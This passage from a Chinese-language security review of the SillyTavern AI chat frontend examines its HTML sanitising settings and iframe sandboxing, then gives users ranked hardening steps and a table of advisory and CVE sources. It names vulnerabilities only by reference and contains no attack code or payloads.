- 有 sandbox：Tavern Helper 作為受控渲染器，應限制 iframe 許可權
- 無 sandbox：卡內 JS 需要 `window.parent` 訪問，sandbox 會破壞功能

**驗證路徑**：在 ST 真機 DevTools 中檢查渲染的 `<iframe>` 元素屬性，確認是否有 `sandbox` 屬性及其值。

### ~~懸案 E：`ADD_TAGS` 是否含 MathML 標籤~~（已解除）

**已確認**：ST 1.14.0 `public/script.js` 的 `messageFormatting()` 中，`ADD_TAGS` 僅含 `['custom-style']`，**不含任何 MathML 標籤**（math、mtext、mglyph 等）。PortSwigger MathML mXSS 向量在預設配置下不適用（需使用者/擴充套件顯式新增 MathML 到 ADD_TAGS 才會觸發）。

來源：ST 1.14.0 `public/script.js` 第 1769 行 [執行時原始碼]

---

## 13. 使用者側自保方案

優先順序由高到低：

1. **更新 ST 到 ≥ 1.17.0**（必須）：修復 Bot Browser 類漏洞 + 多項安全增強
2. **開啟 hostWhitelist**（高優先順序）：`config.yaml` 設 `hostWhitelist.enabled: true`，白名單填 `localhost` / `127.0.0.1` — 防 DNS 重繫結（CVE-2025-59159）
3. **不安裝來源不明的擴充套件**：優先使用 ST GitHub 組織（`SillyTavern/`）下的官方擴充套件
4. **匯入角色卡前審查**：用 `tavern_card_tools` 列印 PNG 內 JSON，重點檢查 `data.extensions.regex` 欄位（內嵌正則指令碼）；對包含大量 HTML 的世界書條目保持謹慎
5. **不啟用 Code Runner 擴充套件**：除非完全信任對話中出現的所有程式碼塊（來源可信、內容可讀）
6. **定期輪換 API Key**：使用服務商的 spending limit / 額度上限，降低洩露損失
7. **只在 localhost 執行 ST**：不暴露到公網；若必須遠端訪問，使用 VPN 或 SSH tunnel 而非直接埠對映

來源：綜合 ST 官方文件 + 安全公告 + 社群實戰
適用版本：ST 1.x
**置信度：medium · [文件·多源 + 推斷]**

---

## 14. 來源彙總

| 類別 | 來源 | URL |
|---|---|---|
| 真實安全事件（Bot Browser） | ST 官方 GitHub Discussion #5592 | https://github.com/SillyTavern/SillyTavern/discussions/5592 |
| DNS 重繫結安全公告 | ST Security Advisory | https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-7cxj-w27x-x78q |
| CVE-2025-59159 詳情 | securityonline.info | https://securityonline.info/critical-flaw-cve-2025-59159-cvss-9-7-in-sillytavern-allows-full-remote-control-of-local-ai-instances/ |
| CVE-2024-47875（DOMPurify mXSS） | cve.news | https://www.cve.news/cve-2024-47875/ |
| CVE-2025-26791（DOMPurify SAFE_FOR_TEMPLATES） | Snyk | https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8722251 |
| DOMPurify 配置誤用分析 | mizu.re | https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations |
| PortSwigger mXSS 研究 | PortSwigger Research | https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss |
| ST 擴充套件開發安全規範 | ST 官方文件 | https://docs.sillytavern.app/for-contributors/writing-extensions/ |
| STScript 安全文件 | ST 官方文件 | https://docs.sillytavern.app/usage/st-script/ |
| ST 正則擴充套件文件 | ST 官方文件 | https://docs.sillytavern.app/extensions/regex/ |
| Code Runner 擴充套件 | GitHub | https://github.com/SillyTavern/Extension-CodeRunner |
| CCv3 角色卡規範 | GitHub | https://github.com/kwaroran/character-card-spec-v3 |
| 角色卡檢查工具 | GitHub | https://github.com/Barafu/tavern_card_tools |
| 本地生產卡原始碼（control_center.js） | 執行時原始碼 | `<local-guide-db>\本地證據\卡A歷史\2.9.1\components\control_center.js` |
| 本地生產卡原始碼（status_bar_regex.html） | 執行時原始碼 | `<local-guide-db>\本地證據\卡A歷史\2.9.1\components\status_bar_regex.html` |
| 本地生產卡原始碼（omni_safe_block_renderer.js） | 執行時原始碼 | `<local-user-path>/<local-drive>\<local-workspace>\卡B\v1.9.3_20260526_002904\components\omni_safe_block_renderer.js` |
